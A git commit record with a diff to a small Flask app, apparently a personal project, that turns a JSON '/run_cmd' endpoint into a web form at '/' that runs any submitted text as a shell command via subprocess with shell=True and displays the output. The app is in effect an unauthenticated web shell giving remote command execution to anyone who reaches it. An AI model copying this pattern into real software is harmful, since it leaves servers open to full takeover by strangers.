0f0d50be2124968586a9f94bace03bb0b78bec40
balckwilliam <32457598+balckwilliam@users.noreply.github.com>
2023-06-08 08:27:52 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,13 +1,21 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, render_template_string
 import subprocess
 
 app = Flask(__name__)
 
-@app.route('/run_cmd', methods=['POST'])
-def run_cmd():
-    command = request.form['command']
-    try:
-        output = subprocess.check_output(command, shell=True)
-        return jsonify({'output': output.decode('utf-8')})
-    except subprocess.CalledProcessError as e:
-        return jsonify({'output': str(e)})
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    output = ""
+    if request.method == 'POST':
+        command = request.form.get('command')
+        try:
+            output = subprocess.check_output(command, shell=True, universal_newlines=True)
+        except Exception as e:
+            output = str(e)
+    return render_template_string("""
+        <form method="POST">
+            Command: <input type="text" name="command">
+            <input type="submit" value="Run">
+        </form>
+        <pre>{{output}}</pre>
+    """, output=output)
